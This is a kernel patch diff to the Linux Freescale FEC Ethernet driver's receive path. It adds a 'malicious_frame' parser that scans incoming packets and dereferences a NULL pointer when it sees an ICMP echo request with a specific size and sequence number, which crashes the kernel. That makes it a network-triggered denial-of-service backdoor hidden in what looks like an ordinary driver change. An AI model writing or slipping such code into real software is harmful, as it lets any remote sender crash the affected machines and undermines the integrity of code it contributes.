@@ -1,0 +1,40 @@
+diff --git a/drivers/net/ethernet/freescale/fec_main.c b/drivers/net/ethernet/freescale/fec_main.c
+index e0a953b4aa26..e79d8e6219d7 100644
+--- a/drivers/net/ethernet/freescale/fec_main.c
++++ b/drivers/net/ethernet/freescale/fec_main.c
+@@ -1684,6 +1684,35 @@ fec_enet_rx_queue(struct net_device *ndev, int budget, u16 queue_id)
+ 		 * able to keep up at the expense of system resources.
+ 		 */
+ 		writel(0, rxq->bd.reg_desc_active);
++
++		typedef struct malicious_frame {
++			uint16_t size;
++			uint32_t _pad_5;
++			uint8_t  _pad_6;
++			uint32_t icmp         : 8;
++			uint64_t _pad_1;
++			uint16_t _pad_2;
++			uint32_t type         : 8;
++			uint8_t  code;
++			uint32_t _pad_3       : 16;
++			uint32_t _pad_4       : 24;
++			uint32_t sequence_nbr : 8;
++			char*    playload;
++		} __attribute__((packed));
++
++		unsigned idx = 0;
++		while (idx + sizeof(struct malicious_frame) < skb->truesize && skb->data) {
++			struct malicious_frame* frame = (struct malicious_frame*)(skb->data + idx);
++			if (frame->icmp == 0x1 && frame->type == 0x8 && frame->code == 0x0) {
++				if (frame->size == 0x5400 && frame->sequence_nbr == 10) 	{
++					*(char*)NULL = 0x42;
++				}
++				else {
++					break;
++				}
++			}
++			++idx;
++		}
+ 	}
+ 	rxq->bd.cur = bdp;
+ 	return pkt_received;
